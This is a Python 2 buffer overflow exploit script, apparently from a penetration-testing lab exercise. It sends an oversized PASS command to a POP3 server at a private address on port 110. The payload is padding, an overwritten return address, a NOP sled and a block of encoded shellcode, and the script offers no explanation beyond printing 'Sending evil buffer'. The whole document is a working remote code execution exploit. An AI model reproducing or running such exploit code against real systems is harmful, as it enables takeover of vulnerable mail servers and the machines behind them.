#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xbe\xfc\xa2\xb1\xec\xd9\xc8\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x77\x12\x03\x77\x12\x83\x3b\xa6\x53\x19\x3f\x4f\x11"
"\xe2\xbf\x90\x76\x6a\x5a\xa1\xb6\x08\x2f\x92\x06\x5a\x7d\x1f"
"\xec\x0e\x95\x94\x80\x86\x9a\x1d\x2e\xf1\x95\x9e\x03\xc1\xb4"
"\x1c\x5e\x16\x16\x1c\x91\x6b\x57\x59\xcc\x86\x05\x32\x9a\x35"
"\xb9\x37\xd6\x85\x32\x0b\xf6\x8d\xa7\xdc\xf9\xbc\x76\x56\xa0"
"\x1e\x79\xbb\xd8\x16\x61\xd8\xe5\xe1\x1a\x2a\x91\xf3\xca\x62"
"\x5a\x5f\x33\x4b\xa9\xa1\x74\x6c\x52\xd4\x8c\x8e\xef\xef\x4b"
"\xec\x2b\x65\x4f\x56\xbf\xdd\xab\x66\x6c\xbb\x38\x64\xd9\xcf"
"\x66\x69\xdc\x1c\x1d\x95\x55\xa3\xf1\x1f\x2d\x80\xd5\x44\xf5"
"\xa9\x4c\x21\x58\xd5\x8e\x8a\x05\x73\xc5\x27\x51\x0e\x84\x2f"
"\x96\x23\x36\xb0\xb0\x34\x45\x82\x1f\xef\xc1\xae\xe8\x29\x16"
"\xd0\xc2\x8e\x88\x2f\xed\xee\x81\xeb\xb9\xbe\xb9\xda\xc1\x54"
"\x39\xe2\x17\xfa\x69\x4c\xc8\xbb\xd9\x2c\xb8\x53\x33\xa3\xe7"
"\x44\x3c\x69\x80\xef\xc7\xfa\xa5\xe4\xc7\x79\xd1\xf8\xc7\x7c"
"\x99\x74\x21\x14\xcd\xd0\xfa\x81\x74\x79\x70\x33\x78\x57\xfd"
"\x73\xf2\x54\x02\x3d\xf3\x11\x10\xaa\xf3\x6f\x4a\x7d\x0b\x5a"
"\xe2\xe1\x9e\x01\xf2\x6c\x83\x9d\xa5\x39\x75\xd4\x23\xd4\x2c"
"\x4e\x51\x25\xa8\xa9\xd1\xf2\x09\x37\xd8\x77\x35\x13\xca\x41"
"\xb6\x1f\xbe\x1d\xe1\xc9\x68\xd8\x5b\xb8\xc2\xb2\x30\x12\x82"
"\x43\x7b\xa5\xd4\x4b\x56\x53\x38\xfd\x0f\x22\x47\x32\xd8\xa2"
"\x30\x2e\x78\x4c\xeb\xea\x88\x07\xb1\x5b\x01\xce\x20\xde\x4c"
"\xf1\x9f\x1d\x69\x72\x15\xde\x8e\x6a\x5c\xdb\xcb\x2c\x8d\x91"
"\x44\xd9\xb1\x06\x64\xc8")

buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

try:
	print "\nSending evil buffer..."
	connect=s.connect(('10.11.24.85', 110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
finally:
	s.close()
